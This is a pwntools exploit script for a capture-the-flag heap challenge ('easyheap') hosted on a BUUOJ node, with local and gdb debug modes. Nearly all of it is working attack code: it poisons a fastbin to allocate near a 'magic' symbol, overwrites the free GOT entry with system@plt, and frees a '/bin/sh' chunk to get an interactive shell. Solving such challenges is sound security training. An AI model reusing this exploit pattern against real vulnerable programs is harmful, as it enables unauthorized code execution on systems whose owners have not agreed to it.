from pwn import *

context.log_level = "info"
LOCAL_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_LIBC = "./libc6_2.23-0ubuntu11_amd64.so"
REMOTE_ADDR = "node4.buuoj.cn"
REMOTE_PORT = 28283

elf = ELF("./easyheap_patched")
ret = 0x0000000000400561

if len(sys.argv) == 2:
    libc = ELF(LOCAL_LIBC)
    if sys.argv[1] == "l":
        sock = process(elf.path)
    elif sys.argv[1] == "d": # Debug
        gs = """
            break *0x400be0
            break *0x4009b0
            break *0x400b21
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
#    libc = ELF(REMOTE_LIBC)
    sock = remote(REMOTE_ADDR, REMOTE_PORT)


def create(size, content):
    sock.sendafter(b"Your choice :",b"1")
    sock.sendafter(b"Size of Heap : ", str(size).encode())
    sock.sendafter(b"Content of heap:", content)
    log.info("create")

def edit(idx, size, content):
    sock.sendafter(b"Your choice :",b"2")
    sock.sendafter(b"Index :", str(idx).encode())
    sock.sendafter(b"Size of Heap : ", str(size).encode())
    sock.sendafter(b"Content of heap : ", content)
    log.info("edit")

def delete(idx):
    sock.sendafter(b"Your choice :",b"3")
    sock.sendafter(b"Index :", str(idx).encode())
    log.info("delete")

def exit():
    sock.sendafter(b"Your choice :",b"4")
    log.info("edit")

def attack():
    create(0x68,b"AAAA")
    create(0x68,b"BBBB")
    create(0x68,b"CCCC")
    delete(2)
    payload = b"/bin/sh\x00" + b"A" * 0x60 + p64(0x71) + p64(elf.sym["magic"] - 0x10 - 3)
    edit(1, len(payload),payload)
    create(0x68,b"EEEE")
    create(0x68,b"FFFF")
    
    payload = b"\xaa" * 3 + p64(0) * 4 + p64(elf.got["free"])
    edit(3, len(payload), payload)
    payload = p64(elf.plt["system"])
    edit(0, len(payload), payload)

    delete(1)

if __name__ == "__main__":
    attack()
    sock.interactive()



